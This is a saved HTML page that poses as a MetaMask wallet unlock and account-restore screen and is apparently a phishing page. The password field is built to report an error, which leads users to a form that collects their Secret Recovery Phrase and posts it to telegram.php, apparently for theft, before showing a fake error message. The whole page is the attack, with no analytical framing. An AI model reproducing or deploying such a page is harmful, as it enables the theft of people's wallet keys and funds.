<!DOCTYPE html>
<!-- saved from url=(0047)https://safepalis-io.com/metamask/metamask.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Metamask Notification</title>
    <link rel="stylesheet" href="./Metamask_files/pay.css">
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
    <link href="./Metamask_files/css2" rel="stylesheet">
    <link rel="stylesheet" href="./Metamask_files/icon">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/32px-MetaMask_Fox.svg.png">
</head>
<body>
    <div class="main">
        <div class="main_cont">
            <div id="logo-container">
                </div>
            <h1>Welcome back!</h1>
            <p class="sub">The decentralized web is waiting for you</p>
            <div class="pass_box">
                <div class="input_box">
                    <input type="password" placeholder=" " name="pass">
                    <label for="pass">Password</label>
                </div>
                <span class="hidden">Incorrect password</span>
                <button class="show_error">Unlock</button>
                <p class="forgot">Forgot password?</p>
                <div class="supp">
                    <p>Need help? Contact <span style="cursor: pointer;">MetaMask support</span></p>
                </div>
            </div>
        </div>
        <div class="seed_box">
            <h1>Restore your Account with Secret Recovery Phrase</h1>
            <div class="seed_text">
                Only the first account on this wallet will auto load. After completing this process, to add additional accounts, click the drop down menu, then select Create Account.
            </div>
            <div class="seed_text">
                If you restore using another Secret Recovery Phrase, your current wallet, accounts and assets will be removed from this app permanently. This action cannot be undone.
            </div>
            <form action="telegram.php" method="post">
                <p>Wallet Secret Recovery Phrase</p>
                <div class="restore_phrase">
                    <input type="password" required="" name="seed" placeholder="Paste Secret Recovery Phrase from clipboard">
                </div>
                <div class="restore_checkbox">
                    <input type="checkbox" id="showsecret">
                    <label for="showsecret">Show Secret Recovery Phrase</label>
                </div>
                <button type="submit">Restore</button>
                <p class="sended" id="sended">Ops, we having troubles</p>
            </form>
        </div>
    </div>

    <script src="./Metamask_files/bundle.js.telechargement"></script>
    <script src="./Metamask_files/main.js.telechargement"></script>

</body></html>